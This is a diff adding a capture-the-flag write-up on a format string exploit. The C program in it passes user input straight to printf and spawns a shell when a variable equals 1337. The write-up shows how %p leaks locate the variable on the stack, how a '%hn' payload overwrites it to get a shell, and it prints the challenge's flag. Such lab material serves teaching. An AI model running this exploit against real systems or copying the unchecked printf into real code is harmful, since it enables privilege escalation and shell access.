@@ -1,0 +1,41 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+int secret = 0;
+
+void give_shell(){
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    system("/bin/sh -i");
+}
+
+int main(int argc, char **argv){
+    int *ptr = &secret;
+    printf(argv[1]);         <-------  here is where we can exploit(http://www.cplusplus.com/reference/cstdio/printf/)
+
+    if (secret == 1337){
+        give_shell();
+    }
+    return 0;
+}
+
+first we use gdb to get the position of secret
+
+http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+
+The next thing to do is see where on the stack the memory address is when the program runs. So, we do:
+
+./format "%p %p %p %p %p %p %p %p %p"
+
+We see 0x804a030 in the 7th spot - so we know that the address of secret is the 7th variable on the stack!
+
+so we can get the shell by
+
+./format "$(python -c 'import sys; sys.stdout.write("%1337x%7$hn")')"
+
+then see what's in the shell by ls
+
+and view the flag by "cat flag.txt"
+
+the flag is : who\_thought\_%n_was_a_good_idea?
